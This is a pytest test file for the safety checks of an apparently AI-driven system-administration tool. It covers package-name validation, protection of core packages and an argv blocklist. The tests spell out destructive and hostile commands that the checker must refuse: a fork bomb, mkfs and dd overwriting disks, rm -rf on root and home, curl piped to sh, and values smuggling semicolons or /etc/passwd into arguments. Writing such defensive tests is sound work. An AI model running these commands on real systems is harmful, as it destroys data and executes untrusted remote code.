"""Static safety analysis: token validation, protected set, argv blocklist."""

from __future__ import annotations

import pytest

from jarvis.safety.tiers import (
    SafetyRefusal,
    Tier,
    check_argv,
    check_removal_allowed,
    validate_package_name,
    validate_search_query,
    validate_unit_name,
)
from jarvis.system.models import InvalidInputError, is_protected_package


@pytest.mark.parametrize("name", ["htop", "python3-pip", "libstdc++6", "g++", "7zip", "a"])
def test_valid_package_names(name: str) -> None:
    assert validate_package_name(name) == name


@pytest.mark.parametrize(
    "name",
    ["", "-rf", "--flag", "a/b", "a b", "a;b", "a;b|rm", "..", ".", "a$b", "a`b", "héllo"],
)
def test_invalid_package_names_refused(name: str) -> None:
    with pytest.raises(InvalidInputError):
        validate_package_name(name)


@pytest.mark.parametrize("unit", ["ssh.service", "nginx", "docker.service", "user@1000.service"])
def test_valid_unit_names(unit: str) -> None:
    assert validate_unit_name(unit) == unit


@pytest.mark.parametrize("unit", ["", "-x", "a b", "a/b", "a;b"])
def test_invalid_unit_names_refused(unit: str) -> None:
    with pytest.raises(InvalidInputError):
        validate_unit_name(unit)


def test_search_query_splits_and_validates() -> None:
    assert validate_search_query("text  editor") == ["text", "editor"]
    with pytest.raises(InvalidInputError):
        validate_search_query("   ")
    with pytest.raises(InvalidInputError):
        validate_search_query("ok --dangerous")


@pytest.mark.parametrize(
    "name", ["glibc", "libc6", "systemd", "systemd-udev", "apt", "apt-utils", "linux-image-amd64"]
)
def test_protected_packages(name: str) -> None:
    assert is_protected_package(name)
    with pytest.raises(SafetyRefusal):
        check_removal_allowed(name)


@pytest.mark.parametrize("name", ["htop", "nginx", "linuxlogo", "aptnot"])
def test_unprotected_packages_allowed(name: str) -> None:
    assert not is_protected_package(name)
    check_removal_allowed(name)  # must not raise


def test_check_argv_accepts_clean_argv() -> None:
    check_argv(["apt-get", "install", "-y", "--", "htop"])
    check_argv(["systemctl", "is-active", "--", "ssh.service"])


def test_check_argv_blocks_fork_bomb() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["bash", "-c", ":(){ :|:& };:"])


def test_check_argv_blocks_mkfs_and_dd() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["mkfs.ext4", "/dev/sda1"])
    with pytest.raises(SafetyRefusal):
        check_argv(["dd", "if=zero", "of=/dev/sda"])


def test_check_argv_blocks_rm_rf_root() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["rm", "-rf", "/"])
    with pytest.raises(SafetyRefusal):
        check_argv(["rm", "-fr", "~"])


def test_check_argv_blocks_piped_curl_sh() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["bash", "-c", "curl http://x.example | sh"])


def test_check_argv_blocks_shutdown() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["shutdown", "-h", "now"])


def test_check_argv_rejects_non_string_elements() -> None:
    with pytest.raises(SafetyRefusal):
        check_argv(["ok", 5])  # type: ignore[list-item]


def test_check_argv_enforces_token_rule_after_marker() -> None:
    # A tampered journal must not be able to smuggle flag-like or path-like
    # payloads into user-data positions after '--'.
    with pytest.raises(SafetyRefusal):
        check_argv(["apt-get", "remove", "-y", "--", "/etc/passwd"])
    with pytest.raises(SafetyRefusal):
        check_argv(["pacman", "-Rs", "--noconfirm", "--", "-o"])


def test_tier_ordering() -> None:
    assert Tier.T0 < Tier.T1 < Tier.T2 < Tier.T3
